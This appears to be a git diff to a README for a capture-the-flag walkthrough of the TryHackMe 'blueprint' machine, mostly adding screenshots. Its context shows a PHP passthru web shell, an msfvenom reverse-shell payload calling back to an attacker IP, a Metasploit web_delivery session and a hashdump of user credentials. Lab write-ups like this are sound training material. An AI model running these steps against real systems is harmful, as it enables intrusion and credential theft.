@@ -1,4 +1,5 @@
-![image](https://github.com/CTF-Walkthroughs/blueprint-walkthrough/assets/97861439/328bebaf-6fbd-4e8b-84dd-e9c9b60fa206)
+
+![Screenshot 2023-06-13 132623](https://github.com/CTF-Walkthroughs/blueprint-walkthrough/assets/97861439/ce0abed5-dd03-4179-830f-2e0c881ef500)
 
 # blueprint-walkthrough
 This is a CTF walkthrough of the machine blueprint on THM
@@ -104,6 +105,8 @@ And we can upload it using the exploit from searchsploit:
 
 We can test our php passthru shell a simple command like 'whoami'.
 
+![Screenshot 2023-06-14 102452](https://github.com/CTF-Walkthroughs/blueprint-walkthrough/assets/97861439/263c9465-863c-48e6-baa8-d95af23e4a91)
+
 **Using Metasploit to convert RCE to a fully interactive shell**
 
 First let's create a payload.
@@ -115,6 +118,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.24.71 LPORT=7777 -f exe 
 Now we can let it rip and catch the shell with the web_delivery module.
 
 And BOOM! We have a meterpreter session on our target. We can issue a 'hashdump' command to grab all the user hashes.
+
+![Screenshot 2023-06-14 102722](https://github.com/CTF-Walkthroughs/blueprint-walkthrough/assets/97861439/b6fec541-5e04-4b45-b917-912871d92462)
 
 msf6 exploit(multi/script/web_delivery) > sessions -i 1
 [*] Starting interaction with 1...
